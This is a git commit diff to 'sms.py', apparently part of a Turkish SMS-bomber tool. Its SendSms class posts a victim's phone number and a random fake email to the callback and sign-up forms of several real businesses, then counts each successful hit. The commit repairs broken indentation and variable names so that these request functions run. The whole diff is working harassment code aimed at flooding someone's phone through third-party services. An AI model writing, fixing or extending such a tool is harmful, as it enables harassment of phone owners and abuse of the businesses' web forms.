5752b0a7cb98c05b44f6e64bccfbf617c42e263e
Mamiozp <mamitablet21@gmail.com>
2025-01-30 05:31:51 +0300

    Update sms.py

--- sms.py
+++ sms.py
@@ -8,14 +8,14 @@ class SendSms():
     adet = 0
     
     def __init__(self, phone, mail):
-       self.phone = str(phone)
+        self.phone = str(phone)
         if len(mail) != 0:
             self.mail = mail
         else:
-            self.mail = ''.join(choice(ascii_lowercase) for i in range(20))+"@gmail.com"
+            self.mail = ''.join(choice(ascii_lowercase) for i in range(20)) + "@gmail.com"
 
-        #erdeger.com.tr
-        def erdeger(self):
+    # erdeger.com.tr
+    def erdeger(self):
         try:
             url = requests.post("https://www.erdeger.com.tr/biz-sizi-arayalim", data={
                 "confirm": "true",
@@ -28,18 +28,16 @@ class SendSms():
                 "password": "31ABC..abc31",
                 "phone": f"0{self.phone}"
             }, timeout=6)
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
-                self.adet += 1   
+            if url.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> erdeger.com.tr")
+                self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
-    
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> erdeger.com.tr")
 
-        
-        #elexushotel.com.tr
-        def elexushotel(self):
+    # elexushotel.com.tr
+    def elexushotel(self):
         try:
             url = requests.post("https://www.elexushotel.com.tr/tr/biz-sizi-arayalim", data={
                 "confirm": "true",
@@ -52,16 +50,14 @@ class SendSms():
                 "password": "31ABC..abc31",
                 "phone": f"0{self.phone}"
             }, timeout=6)
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
-                self.adet += 1   
+            if url.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> elexushotel.com.tr")
+                self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
-    
-  
-   
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> elexushotel.com.tr")
+
     #kahvedunyasi.com
     def KahveDunyasi(self):    
         try:    
